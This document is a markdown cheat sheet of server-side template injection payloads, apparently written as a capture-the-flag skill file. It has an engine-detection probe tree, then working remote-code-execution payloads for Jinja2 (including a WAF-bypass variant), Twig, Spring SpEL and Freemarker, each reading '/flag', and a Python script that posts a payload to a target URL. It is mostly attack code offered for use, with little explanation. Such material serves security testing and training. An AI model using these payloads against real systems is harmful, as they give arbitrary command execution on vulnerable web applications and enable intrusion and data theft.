# Server-Side Template Injection (SSTI) (skills/web/ssti-payloads.md)

## 1. Engine Detection Decision Matrix

Inject probe `${{7*7}}` or `{{7*'7'}}` to identify template engine:

```text
               {{7*7}} -> 49
                     │
         ┌───────────┴───────────┐
     {{7*'7'}} -> 49        {{7*'7'}} -> 7777777
         │                       │
   ┌─────┴─────┐           ┌─────┴─────┐
 Twig       Smarty      Jinja2       Twig
(PHP)       (PHP)      (Python)     (PHP)

               ${7*7} -> 49
                     │
         ┌───────────┴───────────┐
     Java / SpEL / Mako      Freemarker / Thymeleaf
```

---

## 2. RCE Payloads by Engine

### 2.1 Jinja2 (Python / Flask)
- **Direct Builtins & Popen**:
  ```jinja2
  {{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag').read() }}
  ```
- **Filter / WAF Bypass (No quotes / Lipsum trick)**:
  ```jinja2
  {{ lipsum.__globals__[request.args.os].popen(request.args.cmd).read() }}?os=os&cmd=cat+/flag
  ```
- **MRO Subclasses Traversal**:
  ```jinja2
  {{ ''.__class__.__mro__[1].__subclasses__()[132]('cat /flag',shell=True,stdout=-1).communicate()[0] }}
  ```

### 2.2 Twig (PHP)
```twig
{{ ['cat /flag']|filter('system') }}
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("cat /flag") }}
```

### 2.3 Spring Framework / SpEL (Java)
```java
${T(java.lang.Runtime).getRuntime().exec("cat /flag")}
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("cat /flag").getInputStream())}
```

### 2.4 Freemarker (Java)
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("cat /flag") }
```

---

## 3. Python Automation Solver Snippet
```python
import requests

url = "http://target:8080/profile"
payload = "{{ lipsum.__globals__['os'].popen('cat /flag').read() }}"
res = requests.post(url, data={"username": payload})
print(f"[+] Flag Result: {res.text}")
```
